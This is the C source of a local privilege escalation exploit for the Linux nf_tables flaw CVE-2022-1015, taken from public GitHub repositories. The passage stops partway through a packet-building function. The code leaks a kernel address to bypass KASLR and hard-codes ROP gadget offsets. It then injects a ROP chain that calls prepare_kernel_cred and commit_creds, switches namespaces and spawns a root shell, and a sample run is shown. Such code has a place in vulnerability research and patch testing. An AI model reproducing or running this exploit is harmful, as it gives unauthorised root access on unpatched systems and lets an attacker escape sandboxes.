// https://github.com/ysanatomic/CVE-2022-1015/blob/main/exploit.c
// https://github.com/pqlx/CVE-2022-1015

/*
 # ./exploit
 [*] CVE-2022-1015 LPE Exploit by @YordanStoychev

 uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
 [*] Setting up user+network namespace sandbox

 [+] STAGE 1: KASLR bypass
 [*] Socket is opened.
 [*] Table leak_table created.
 [*] Chain output_chain created.
 [*] Bitwise expression is setup!
 [*] Payload expression is setup!
 [*] Verdict is setup!
 [*] Address leak rule created!
 [*] Packet sent... if no output in a second - it has failed
 [*] Listening on port 50005
 [&] Leaked Address: 0xffffffff819bfc63
 [&] Kernel base address: 0xffffffff81000000

 [+] STAGE 2: Escalation
 [*] Socket is opened.
 [*] Table rop_table created.
 [*] Chain output_chain created.
 [*] Copy ROP-to-Stack rules created.
 [*] Saved userland registers
 [#] cs: 0x33
 [#] ss: 0x2b
 [#] rsp: 0x7ffd969d1da0
 [#] rflags: 0x246

 [*] TCP Listener and client threads created!
 [+] TCP server socket created.
 [+] Bind to the port number: 50006
 [*] Listening...
 [*] Successfully sent 60 bytes SYN!
 [*] Successfully received 48 bytes SYN-ACK!
 [*] Sending an ACK packet with the payload...
 [***] Exploit ran sucessfully
 uid=0(root) gid=0(root)
 #
*/


#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include <time.h>
#include <stdlib.h>
#include <string.h>


#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <pthread.h>
#include <inttypes.h>
#include <assert.h>

#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>



#define release_sock_63 0x9bfc63
#define DATAGRAM_LEN 4096
#define OPT_SIZE 20


unsigned long* new_stack;
unsigned long stack_addr;

typedef struct listener_data {
	uint16_t port;
	char address[8];
} listener_data;

enum rule_call_types {
	RULE_ADDRESS_LEAK,
	RULE_ROP_CHAIN,
	RULE_INBOUND_OUTBOUND,
	RULE_PORT_CHECK
};

typedef struct udp_data {
	char* data;
	size_t size;
	uint16_t port;
	char* addr;
	size_t addr_size;
} udp_data;

/*
	96 bit (12 bytes) pseudo header needed for tcp header checksum calculation
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

unsigned short checksum(const char *buf, unsigned size)
{
	unsigned sum = 0, i;

	/* Accumulate checksum */
	for (i = 0; i < size - 1; i += 2) {
		unsigned short word16 = *(unsigned short *) &buf[i];
		sum += word16;
	}

	/* Handle odd-sized case */
	if (size & 1) {
		unsigned short word16 = (unsigned char) buf[i];
		sum += word16;
	}

	/* Fold to get the ones-complement result */
	while (sum >> 16) sum = (sum & 0xFFFF)+(sum >> 16);

	/* Invert to get the negative in ones-complement arithmetic */
	return ~sum;
}


void *send_udp_packet(void *arg);
void *send_tcp_packet(void *arg);
void *send_tcp_raw(void *arg);
void *empty_tcp_listener(void *arg);

static struct nftnl_table *table_add_parse(char* table_name) {
	struct nftnl_table *t; // create struct
	uint16_t family = AF_INET; // the family of the table
	t = nftnl_table_alloc(); // allocate the table
	if (t == NULL) {
		perror("[!] Couldn't allocate a table");
		exit(EXIT_FAILURE);
	}

	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family); // set the family
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); // set the name

	return t;
}

static struct nftnl_chain *chain_add_parse(char* table_name, char* chain_name, int hooknum)
{
	struct nftnl_chain *t;
	//int hooknum = NF_INET_LOCAL_OUT;

	t = nftnl_chain_alloc();
	if (t == NULL) {
		perror("[!] Couldn't allocate a chain");
		return NULL;
	}
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); // set priority to 0
	nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hooknum);
	return t;
}

void setup_table_and_chain(char* table_name, char* base_chain_name, int hooknum){
	char buf_table[MNL_SOCKET_BUFFER_SIZE];
	char buf_chain[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh; // netlink message header
	uint32_t portid, t_seq, c_seq, table_seq, chain_seq, family;
	struct nftnl_table *t_table; // netfilter netlink table
	struct nftnl_chain *t_chain;
	struct mnl_nlmsg_batch *batch_table, *batch_chain;
	int ret;


	// **** TABLE SETUP ****

	t_table = table_add_parse(table_name); // the table
	t_seq = time(NULL); // t sequence num
	batch_table = mnl_nlmsg_batch_start(buf_table, sizeof(buf_table)); // starts a batch of messages
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_table), t_seq++); // 'begins' the batch

	mnl_nlmsg_batch_next(batch_table); // denominates that a new message starts
	table_seq = t_seq;
	family = nftnl_table_get_u32(t_table, NFTNL_TABLE_FAMILY); // get the family back?
	nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_table), // build the netlink header
					NFT_MSG_NEWTABLE, family,
					NLM_F_CREATE|NLM_F_ACK, t_seq++);
	nftnl_table_nlmsg_build_payload(nlh, t_table); // build the payload
	nftnl_table_free(t_table); // free the allocated table
	mnl_nlmsg_batch_next(batch_table); // denominates that a new message can start

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_table), t_seq++); // ends the nftnl batch section
	mnl_nlmsg_batch_next(batch_table);


	// **** CHAIN SETUP ****

	c_seq = time(NULL); // sequence num
	t_chain = chain_add_parse(table_name, base_chain_name, hooknum);
	batch_chain = mnl_nlmsg_batch_start(buf_chain, sizeof(buf_chain)); // starts a batch of messages
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_chain), c_seq++);
	mnl_nlmsg_batch_next(batch_chain);
	chain_seq = c_seq;
	family = NFPROTO_IPV4;
	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_chain),
					NFT_MSG_NEWCHAIN, family,
					NLM_F_CREATE|NLM_F_ACK, c_seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t_chain);
	nftnl_chain_free(t_chain); // free the allocated chain
	mnl_nlmsg_batch_next(batch_chain); // denominates that a new message can start

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_chain), c_seq++); // nftnl batch section
	mnl_nlmsg_batch_next(batch_chain);


	// *** SETTING UP THE SOCKET ***
 	struct mnl_socket* nl_soc = mnl_socket_open(NETLINK_NETFILTER); // netlink socket
	if(nl_soc == NULL){
		perror("[!] mnl_socket_open");
		exit(EXIT_FAILURE);
	}


	if(mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0){ // attempt to bind
		perror("[!] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	printf("[*] Socket is opened. \n");

	portid = mnl_socket_get_portid(nl_soc); // gets the portid

	// *** SENDING TABLE BATCH ***
	if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_table),
			      mnl_nlmsg_batch_size(batch_table)) < 0) {
		perror("[!] mnl_socket_send *table*");
		exit(EXIT_FAILURE);
	}
	mnl_nlmsg_batch_stop(batch_table); // stop the batch

	ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
	while (ret > 0) {
		ret = mnl_cb_run(buf_table, ret, table_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
	}

	if (ret == -1) {
		perror("[!] Error adding table");
		exit(EXIT_FAILURE);
	}
	printf("[*] Table %s created. \n", table_name);

	// *** SENDING CHAIN BATCH ***
	if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_chain),
			      mnl_nlmsg_batch_size(batch_chain)) < 0) {
		perror("[!] mnl_socket_send *chain*");
		exit(EXIT_FAILURE);
	}
	mnl_nlmsg_batch_stop(batch_chain); // stop the batch

	ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
	while (ret > 0) {
		ret = mnl_cb_run(buf_chain, ret, chain_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
	}

	if (ret == -1) {
		perror("[!] Error adding chain");
		exit(EXIT_FAILURE);
	}
	printf("[*] Chain %s created. \n", base_chain_name);

	mnl_socket_close(nl_soc);
}


static void add_bitwise(struct nftnl_rule *r, uint32_t shift_type, uint32_t expr_len,
    uint32_t expr_sreg, uint32_t expr_dreg, void* data, uint32_t data_len)
{

	if(expr_len > 0xff) {
		printf("Bitwise len is over 0xff \n");
		exit(EXIT_FAILURE);
	}

	struct nftnl_expr* e;
	e = nftnl_expr_alloc("bitwise");

	nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, expr_sreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, expr_dreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_OP, shift_type);
	nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, expr_len);
	nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);

}

static void add_payload_set(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t sreg){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("payload");

	nftnl_expr_set_u32(e, NFTA_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_SREG, sreg);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_CSUM_TYPE, NFT_PAYLOAD_CSUM_NONE);

	nftnl_rule_add_expr(r, e);

}

static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg) {
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("payload");

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);

	nftnl_rule_add_expr(r, e);

}

static void add_cmp(struct nftnl_rule *r, uint32_t op, uint32_t sreg, void* data, size_t data_len){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("cmp");
	nftnl_expr_set_u32(e, NFTA_CMP_OP, op);
	nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
	nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}
static void set_verdict(struct nftnl_rule* r, uint32_t verdict)
{
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("immediate");

	nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); // 0 is verdict register

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); // send the verdict
	nftnl_rule_add_expr(r, e);
}

static void set_register_to_value(struct nftnl_rule* r, uint32_t dreg, void* data, size_t data_len){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("immediate");

	nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, dreg);

	nftnl_expr_set_data(e, NFTA_IMMEDIATE_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);

}



static struct nftnl_rule* setup_leak_address_rule(uint8_t family, const char *table,
				   const char *chain, uint16_t port)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc(); // attemps to allocate the rule
	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// *** CHECK PORT TO REDUCE NOISE ***
	// first we have to copy the port into a register
	// important: the destination port is at offset 2 bytes of the udp header
	// the port's size is also 2 bytes
	// we will copy it to (small) register 1
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);

	// now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &port_net, sizeof port_net);


	// *** PREPARE BITWISE EXPRESSION ***
	// This expression will be used to leak the address and save it
	// into a register
	uint32_t bitwise_len = 0x20; // the address is 8 bytes
	uint32_t bitwise_sreg = 0xfffffffe; // 0xfe * 4 = 0x3f8 (0x3c0 + 0x38) -> where the kernel address is
	uint32_t bitwise_dreg = NFT_REG32_05; // we write it into the first register
	uint32_t bitwise_shift_value_data = 0; // we set the shift value to 0 (that's the data)
	uint32_t bitwise_shift_type = NFT_BITWISE_RSHIFT; // must be NFT_BITWISE_LSHIFT or NFT_BITWISE_RSHIFT


	add_bitwise(r, bitwise_shift_type, bitwise_len, bitwise_sreg, bitwise_dreg, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));
	printf("[*] Bitwise expression is setup! \n");

	// *** PREPARE PAYLOAD SET EXPRESSION ***
	// This expression will be used to get the address from a register and write it
	// into the packet
	uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
	uint32_t payload_offset = 8; // we set the offset to after the UDP header.
	uint32_t payload_len = 0x8; // 8 bytes -> the address
	uint32_t payload_sreg = NFT_REG32_05; // we get it from the first register

	add_payload_set(r, payload_base, payload_offset, payload_len, payload_sreg);
	printf("[*] Payload expression is setup! \n");


	// *** SET THE VERDICT TO CONTINUE ***
	set_verdict(r, NFT_CONTINUE);
	printf("[*] Verdict is setup! \n");

	return r;
}

/* EXPLOIT SECTION - ROP STUFF, SHELLS, ETC */
#define prepare_kernel_cred 0x108aa0
#define commit_creds 0x108870
#define pop_rdi_ret 0x004616
#define mov_rdi_rax_pop_rbx_ret 0x020b1d
#define swapgs_restore_regs_and_return_to_usermode 0xe01006
#define find_task_by_vpid 0x101b70
#define init_nsproxy 0x185eea0
#define switch_task_namespaces 0x107030
#define pop_rsi_ret 0x0006a1
#define xchg_esp_eax_ret 0x0d9cde
#define mov_eax_esp_pop_r12_ret 0x004ca3
#define sub_eax_edx_ret 0x06ad25
#define pop_rdx_ret 0x01d0e2
#define cli_ret 0x06d8e0
#define pop_rax_ret 0x08e258
#define add_rsp_0xa80_ret 0x065493
#define bpf_get_current_task 0x1ff770
extern void spawnShell(){
	printf("[***] Exploit ran successfully \n");
	system("id");
	system("/bin/sh"); // we just spawn a shell
}

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_userland_registers(){
 __asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;" // saves the cs register
		"mov user_ss, ss;" // saves the ss register
		"mov user_sp, rsp;" // saves the stack pointer
		"pushf;" // pushes the flags on the stack
		"pop user_rflags;" // pops the flags from the stack to user_rflags
		".att_syntax;"
 );
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);

}

static struct nftnl_rule* check_port(uint8_t family, const char *table_name,
 const char* chain_name, uint64_t kbase, uint16_t port){
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();

	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// *** CHECK PORT TO REDUCE NOISE ***
	// first we have to copy the port into a register
	// important: the destination port is at offset 2 bytes of the udp header
	// the port's size is also 2 bytes
	// we will copy it to (small) register 1
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);
	// now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_CMP_NEQ, NFT_REG32_01, &port_net, sizeof port_net);
	set_verdict(r, NF_ACCEPT); // if the port is not the same directly accept the packet without performing other expressions
	return r;
}

static struct nftnl_rule* check_inbound_or_outbound_rule(uint8_t family, const char *table_name,
 const char* chain_name, uint64_t kbase, uint16_t port){
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();

	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);


	/* EXPRESSIONS TO CHECK IF IT IS INBOUND OR OUTBOUND */
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0x88, 8, NFT_REG32_01); // we get the first word of the payload before we overwrite it

	// now we change the first word
	uint64_t new_first_word = 0xffffffffffffffff; // we will set the first word to 8 bytes of 0xff
	set_register_to_value(r, NFT_REG32_06, &new_first_word, sizeof new_first_word); // we set a register to the new word
	add_payload_set(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0x88, 8, NFT_REG32_06); // we set the word no matter what it was

	uint64_t zeroed_word = 0x0;
	// and now we will actually check what the word was
	add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &zeroed_word, sizeof zeroed_word);
	// if the word is 0x0 before we changed it -> the cmp is true -> packet is accepted
	// if the word was not 0x0 before we changed it -> the cmp is false -> goes to next rule
	// > if the word was 0x0 before we changed it -> it will skip the rest of the expressions in the rule
	// > if it wasn't it will go down the rules

	set_verdict(r, NF_ACCEPT); // NF_ACCEPT will skip all the other rules in the chain and just accept the packet
	// that is what we do if it outbound - accepting it directly will not inject the chain
	return r;
}
static struct nftnl_rule* setup_rop_chain_rules(uint8_t family, const char *table_name,
 const char* chain_name, uint64_t kbase, uint16_t port){
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();

	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);


	/* RULE TO COPY THE ROP CHAIN */
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0x28, 0xb8, 0xffffffe4);


	// *** SET THE VERDICT TO CONTINUE ***
	set_verdict(r, NF_ACCEPT);
	return r;
}

void send_ROP_chain(uint16_t port, uint64_t kbase, pid_t process_id) {
	int payload_size = 23;
	unsigned long payload[payload_size];
	int offset = 0;
	payload[offset++] = kbase + cli_ret;
	payload[offset++] = kbase + pop_rdi_ret;
	payload[offset++] = 0x0; // first argument of prepare_kernel_cred
	payload[offset++] = kbase + prepare_kernel_cred;
	payload[offset++] = kbase + mov_rdi_rax_pop_rbx_ret;
	payload[offset++] = 0x0; // dummy rbx
	payload[offset++] = kbase + commit_creds;
	payload[offset++] = kbase + pop_rdi_ret;
	payload[offset++] = process_id;
	payload[offset++] = kbase + find_task_by_vpid;
	//payload[offset++] = kbase + bpf_get_current_task;
	payload[offset++] = kbase + mov_rdi_rax_pop_rbx_ret;
	payload[offset++] = 0x0; // dummy rbx
	payload[offset++]	= kbase + pop_rsi_ret;
	payload[offset++] = kbase + init_nsproxy;
	payload[offset++] = kbase + switch_task_namespaces;
	payload[offset++] = kbase + swapgs_restore_regs_and_return_to_usermode;
	payload[offset++] = 0x0; // dummy rax
	payload[offset++] = 0x0; // dummy rdi
	payload[offset++] = (unsigned long)spawnShell;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;


	char* dest_addr = "127.0.0.1"; // some random shit

	pthread_t thread_id_send_rop;
	pthread_t thread_id_tcp_listener;
	struct listener_data ldata;
	ldata.port = port;
	struct udp_data dummy_data;
	dummy_data.data = (char *)payload;
	dummy_data.size = payload_size * 8;
	dummy_data.port = port;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	pthread_create(&thread_id_tcp_listener, NULL, empty_tcp_listener, (void *)&ldata);
	pthread_create(&thread_id_send_rop, NULL, send_tcp_raw, (void *)&dummy_data);
//	pthread_create(&thread_id_send_rop, NULL, send_tcp_packet, (void *)&dummy_data);
	printf("[*] TCP Listener and client threads created! \n");
	pthread_join(thread_id_send_rop, NULL);
	pthread_join(thread_id_tcp_listener, NULL);
}

void add_rule(char* table_name, char* base_chain, char ruletype, uint16_t port,
 uint64_t kbase){
	struct mnl_socket *nl_soc;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret;

	family = NFPROTO_IPV4;

	if (ruletype == RULE_ADDRESS_LEAK)
		r = setup_leak_address_rule(family, table_name, base_chain, port);
	else if(ruletype == RULE_ROP_CHAIN)
		r = setup_rop_chain_rules(family, table_name, base_chain, kbase, port);
	else if(ruletype == RULE_INBOUND_OUTBOUND)
		r = check_inbound_or_outbound_rule(family, table_name, base_chain, kbase, port);
	else if(ruletype == RULE_PORT_CHECK)
		r = check_port(family, table_name, base_chain, kbase, port);
	else {
		printf("[!] No such rule code \n");
		exit(EXIT_FAILURE);
	}
	nl_soc = mnl_socket_open(NETLINK_NETFILTER);
	if (nl_soc == NULL) {
		perror("[!] mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("[!] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
		NFT_MSG_NEWRULE,
		nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
		NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("[!] mnl_socket_sendto *rule*");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl_soc, buf, sizeof(buf));
	if (ret == -1) {
		perror("[!] mnl_socket_recvfrom");
		exit(EXIT_FAILURE);
	}

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl_soc), NULL, NULL);
	if (ret < 0) {
		perror("[!] mnl_cb_run");
		exit(EXIT_FAILURE);
	}

	mnl_socket_close(nl_soc);

}

void *receive_address(void *arg){

	listener_data *ldata = (listener_data *) arg;
	uint16_t port = ldata->port;

	char message[8];
	bzero(message, 8);
	int bytes;
	int ret;

	int soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if (soc < 0) {
			perror("[!] Error setting up UDP socket");
			exit(EXIT_FAILURE);
	}

	int reuse_address = 1;

	setsockopt(soc, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof reuse_address);

	struct sockaddr_in addr;
	inet_aton("127.0.0.1", &addr.sin_addr);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);


	ret = bind(soc, (struct sockaddr*)&addr, sizeof(addr));
	if (ret < 0) {
			perror("[!] Problem binding");
			exit(EXIT_FAILURE);
	}
	printf("[*] Listening on port %d \n", port);
	bytes = recvfrom(soc, (char *)message, sizeof message, MSG_WAITALL, (struct sockaddr *)&addr, sizeof(addr));
	message[bytes] = '\0';
	// while ((bytes = read(soc, message, 1024)) > 0) {
	// 	break;
	// }
	memcpy(&ldata->address, &message, 16);
	pthread_exit(NULL);
}

void *send_udp_packet(void *arg){
	// first lets sleep for a second to wait for the listener to be setup
	sleep(0.5);
	udp_data *udata = (udp_data *) arg;
	size_t size = udata->size;
	char* data = udata->data;
	uint16_t port = udata->port;
	char* dest_addr = udata->addr;

	int sock;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(dest_addr);

	sendto(sock, data, size, 0, (struct sockaddr *)&addr, sizeof(addr));

	close(sock);

	pthread_exit(NULL);
}

void read_seq_and_ack(const char* packet, uint32_t* seq, uint32_t* ack)
{
	// read sequence number
	uint32_t seq_num;
	memcpy(&seq_num, packet + 24, 4);
	// read acknowledgement number
	uint32_t ack_num;
	memcpy(&ack_num, packet + 28, 4);
	// convert network to host byte order
	*seq = ntohl(seq_num);
	*ack = ntohl(ack_num);
}


int receive_from(int sock, char* buffer, size_t buffer_length, struct sockaddr_in *dst) {
	unsigned short dst_port;
	int received;
	do {
		received = recvfrom(sock, buffer, buffer_length, 0, NULL, NULL);
		if (received < 0)
			break;
		memcpy(&dst_port, buffer + 22, sizeof(dst_port));
	}
	while (dst_port != dst->sin_port);
	return received;
}

void stage_syn_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** syn_packet,
		int *syn_packet_len){

	// first we need to construct the IP header for the syn packet
	// and do other setup
	char *datagram = calloc(4096, sizeof(char));

	struct iphdr *iph = (struct iphdr*)datagram;
	struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct iphdr));
	struct pseudo_header psh;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
	iph->id = htonl(rand() % 65535); // id of this packet
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; // correct calculation follows later
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;

	tcph->source = src->sin_port;
	tcph->dest = dst->sin_port;
	tcph->seq = htonl(rand() % 4294967295);
	tcph->ack_seq = htonl(0);
	tcph->doff = 10; // tcp header size
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->check = 0; // correct calculation follows later
	tcph->window = htons(5840); // window size
	tcph->urg_ptr = 0;

	psh.source_address = src->sin_addr.s_addr;
	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + OPT_SIZE);
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE;
	// fill pseudo packet
	char* pseudogram = malloc(psize);
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPT_SIZE);

	// TCP options are only set in the SYN packet
	// ---- set mss ----
	datagram[40] = 0x02;
	datagram[41] = 0x04;
	int16_t mss = htons(48); // mss value
	memcpy(datagram + 42, &mss, sizeof(int16_t));
	// ---- enable SACK ----
	datagram[44] = 0x04;
	datagram[45] = 0x02;
	// do the same for the pseudo header
	pseudogram[32] = 0x02;
	pseudogram[33] = 0x04;
	memcpy(pseudogram + 34, &mss, sizeof(int16_t));
	pseudogram[36] = 0x04;
	pseudogram[37] = 0x02;

	tcph->check = checksum((const char*)pseudogram, psize);
	iph->check = checksum((const char*)datagram, iph->tot_len);

	*syn_packet = datagram;
	*syn_packet_len = iph->tot_len;
	free(pseudogram);
}


void stage_ack_packet(struct sockaddr_in* src, struct sockaddr_in* dst, char** ack_packet,
		int *ack_packet_len, char* data, size_t data_size, int32_t seq, int32_t ack_seq){


	char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

	// required structs for IP and TCP header
	struct iphdr *iph = (struct iphdr*)datagram;
	struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct iphdr));
	struct pseudo_header psh;

	// IP header configuration
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE + data_size;
	iph->id = htonl(rand() % 65535); // id of this packet
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; // correct calculation follows later
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;

	// TCP header configuration
	tcph->source = src->sin_port;
	tcph->dest = dst->sin_port;
	tcph->seq = htonl(seq);
	tcph->ack_seq = htonl(ack_seq);
	tcph->doff = 10; // tcp header size
	tcph->fin = 0;
	tcph->syn = 0;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 1;
	tcph->urg = 0;
	tcph->check = 0; // correct calculation follows later
	tcph->window = htons(5840); // window size
	tcph->urg_ptr = 0;

	psh.source_address = src->sin_addr.s_addr;
